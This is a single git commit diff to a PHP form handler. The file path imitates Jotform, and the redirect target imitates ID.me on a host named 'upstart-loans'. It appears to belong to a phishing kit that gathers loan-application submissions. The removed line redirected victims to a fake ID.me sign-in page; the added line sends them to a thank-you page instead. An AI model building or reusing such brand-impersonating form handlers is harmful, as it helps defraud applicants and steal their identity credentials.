4d9db82d6498f9a238b4a8e7edf4e8abb3ae642d
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-03-31 14:27:47 +0100

    thanks

--- public/application/form.jotform.com/submit.php
+++ public/application/form.jotform.com/submit.php
@@ -201,7 +201,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
+header("Location:https://upstart-loans.onrender.com/thankyou.html");
 
 exit;
 }
